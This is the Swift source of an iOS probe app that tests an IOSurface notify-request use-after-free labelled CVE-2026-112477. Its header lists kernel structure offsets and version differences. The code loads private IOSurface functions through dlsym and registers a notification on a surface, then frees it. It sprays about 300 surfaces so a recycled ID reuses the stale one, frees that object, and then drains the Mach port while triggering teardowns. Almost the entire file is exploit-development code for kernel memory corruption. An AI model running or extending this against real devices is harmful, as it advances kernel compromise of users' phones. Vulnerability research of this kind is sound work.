// AGXProbe v94 - CVE-2026-112477 (IOSurface notify request UAF) empirical test
//
// Model (from static analysis of com.apple.iokit.IOSurface @24A446):
//   IOSurfaceRoot          +0x150 lock, +0x188 notify-request list head, +0x190 tail
//   IOSurfaceNotifyRequest +0x00 next, +0x08 prev, +0x10 embedded port object,
//                          +0x20 key, +0x50 extra, +0x58 IOSurface*   (0x60 bytes)
//   IOSurface              +0x10 index, +0xd8 lock, +0xe8 root,
//                          +0xf0 flags (bit0 = "tearing down"), +0xf1 dying flag (27.2 only),
//                          +0x108 element array base, +0x110 element count, +0x118 tag
//
//   27.0.1  addNotifyRequest()  : NO dying check
//   27.0.1  removeNotifyForObj(): unlinks requests, does NOT set the dying flag
//   27.2    removeNotifyForObj(): sets obj->+0xf1 = 1 first
//   27.2    addNotifyRequest()  : refuses with 0xE00002D8 if obj->+0xf1 is set
//
// Test:
//   1. register notify on surface A, release A  -> does the request survive the surface?
//   2. re-register on the stale ID, free the recycled surface -> who does the ID resolve to?
//   3. trigger teardown events and receive on the notify port -> is the dispatch exercised?

import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v94 - notify UAF (CVE-2026-112477)").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v94")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v94 - notify UAF empirical test ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }

        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)

        func makeSurface(w: Int, h: Int) -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = w
            props["IOSurfaceHeight"] = h
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }
        func release(_ p: UnsafeMutableRawPointer?) {
            guard let p = p else { return }
            Unmanaged<AnyObject>.fromOpaque(p).release()
        }
        func krName(_ kr: kern_return_t) -> String {
            switch kr {
            case KERN_SUCCESS: return "OK"
            case Int32(bitPattern: 0xe00002bd): return "NoMemory"
            case Int32(bitPattern: 0xe00002c2): return "BadArgument"
            case Int32(bitPattern: 0xe00002c9): return "Duplicate/Exists"
            case Int32(bitPattern: 0xe00002d8): return "NotAttached(27.2 guard)"
            default: return String(format: "0x%08x", UInt32(bitPattern: kr))
            }
        }

        // notify port
        var gPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("[*] notify port 0x\(String(gPort, radix: 16)) kr=\(krName(kr))")
        if kr != KERN_SUCCESS { status = "Complete"; isRunning = false; return }

        // ---- Phase 1: does the request survive the surface? -------------------
        emit("\n=== Phase 1: request vs surface lifetime ===")
        guard let sA = makeSurface(w: 64, h: 64) else { emit("[-] create A failed"); status = "Complete"; isRunning = false; return }
        let idA = gGetID(sA)
        emit("[A] id 0x\(String(idA, radix: 16))")
        let krSet0 = gSet(gPort, 1, UInt64(idA))
        emit("[A] set_notify  -> \(krName(krSet0))")
        release(sA)
        emit("[A] released (surface destroyed, notify NOT removed)")

        // spray different-sized surfaces so a recycled id lands on a distinct object
        var sprayed: [UnsafeMutableRawPointer?] = []
        var recycled: UnsafeMutableRawPointer? = nil
        var recycledIdx = -1
        for i in 0..<300 {
            let w = 128 + (i % 7) * 16
            if let s = makeSurface(w: w, h: w) {
                sprayed.append(s)
                if gGetID(s) == idA, recycled == nil { recycled = s; recycledIdx = i }
            }
        }
        emit("[*] sprayed \(sprayed.count); recycled id 0x\(String(idA, radix: 16)) at #\(recycledIdx)")

        let krRem1 = gRemove(UInt64(idA))
        emit("[P1] remove(stale id) after surface death -> \(krName(krRem1))")
        let krSet1 = gSet(gPort, 1, UInt64(idA))
        emit("[P1] set_notify(stale id) again          -> \(krName(krSet1))")

        // ---- Phase 2: who does the stale ID resolve to? ------------------------
        emit("\n=== Phase 2: stale-ID resolution identity ===")
        if let rec = recycled {
            emit("[P2] releasing the recycled surface (id 0x\(String(idA, radix: 16)))")
            release(rec)
            let krRem2 = gRemove(UInt64(idA))
            emit("[P2] remove(stale id) after recycled death -> \(krName(krRem2))")
            let krSet2 = gSet(gPort, 1, UInt64(idA))
            emit("[P2] set_notify(stale id) again            -> \(krName(krSet2))")
        } else {
            emit("[P2] no recycled surface found")
        }
        for s in sprayed { release(s) }

        // ---- Phase 3: is the dispatch exercised? ------------------------------
        emit("\n=== Phase 3: notification delivery ===")
        func drain(tag: String) {
            var buf = [UInt8](repeating: 0, count: 4096)
            let r = buf.withUnsafeMutableBytes { raw -> kern_return_t in
                let hdr = raw.baseAddress!.assumingMemoryBound(to: mach_msg_header_t.self)
                return mach_msg(hdr, MACH_RCV_TIMEOUT, 0, 4096, mach_port_name_t(gPort), 500_000, 0)
            }
            if r == KERN_SUCCESS {
                let msgh = UnsafeRawPointer(buf).assumingMemoryBound(to: mach_msg_header_t.self).pointee
                let first8 = buf.prefix(24).map { String(format: "%02x", $0) }.joined()
                emit("[\(tag)] MESSAGE msgh_size=\(msgh.msgh_size) id=\(msgh.msgh_id) bytes=\(first8)")
            } else {
                emit("[\(tag)] no message (kr=\(krName(r)))")
            }
        }
        drain(tag: "P3")

        // create+free surfaces: each teardown is a candidate notify trigger
        var made = 0
        for i in 0..<40 {
            if let s = makeSurface(w: 64 + (i % 5) * 8, h: 64) {
                made += 1
                _ = gGetID(s)
                release(s)
            }
        }
        emit("[P3] created+freed \(made) surfaces")
        drain(tag: "P3-after-teardown")

        // a fresh registration, then more teardowns
        if let sB = makeSurface(w: 64, h: 64) {
            let idB = gGetID(sB)
            let krSetB = gSet(gPort, 1, UInt64(idB))
            emit("[P3] fresh surface id 0x\(String(idB, radix: 16)) set_notify -> \(krName(krSetB))")
            release(sB)
            for i in 0..<20 {
                if let s = makeSurface(w: 96, h: 96) { release(s) }
            }
            drain(tag: "P3-after-fresh")
        }

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}

// mach_task_self is not exposed by the Darwin module on iOS
@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t
